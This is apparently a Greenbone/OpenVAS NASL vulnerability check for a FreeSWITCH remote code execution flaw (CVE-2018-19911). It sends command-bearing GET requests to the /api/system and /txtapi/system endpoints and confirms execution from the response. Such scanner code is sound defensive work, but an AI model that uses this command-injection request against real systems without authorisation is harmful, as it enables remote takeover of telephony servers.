CPE = "cpe:/a:freeswitch:freeswitch";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.143233" );
	script_version( "2021-09-06T11:01:35+0000" );
	script_tag( name: "last_modification", value: "2021-09-06 11:01:35 +0000 (Mon, 06 Sep 2021)" );
	script_tag( name: "creation_date", value: "2019-12-06 09:27:29 +0000 (Fri, 06 Dec 2019)" );
	script_tag( name: "cvss_base", value: "7.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-08-24 17:37:00 +0000 (Mon, 24 Aug 2020)" );
	script_cve_id( "CVE-2018-19911" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "FreeSWITCH RCE Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_freeswitch_consolidation.sc", "os_detection.sc", "global_settings.sc" );
	script_mandatory_keys( "freeswitch/detected" );
	script_require_ports( "Services/www", 8080, 8181 );
	script_tag( name: "summary", value: "FreeSWITCH is prone to a remote code execution vulnerability." );
	script_tag( name: "insight", value: "When mod_xml_rpc is enabled FreeSWITCH allows remote attackers to execute
  arbitrary commands via the api/system or txtapi/system (or api/bg_system or txtapi/bg_system) query string, as
  demonstrated by an api/system?calc URI." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "https://github.com/iSafeBlue/freeswitch_rce/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
urls = make_list( "/api/system",
	 "/txtapi/system" );
cmds = exploit_commands();
for url in urls {
	for pattern in keys( cmds ) {
		url = dir + url + "/?" + cmds[pattern];
		req = http_get( port: port, item: url );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(egrep( pattern: pattern, string: res )){
			report = "It was possible to execute the \"" + cmds[pattern] + "\" command.\n\nResult:\n\n" + res;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

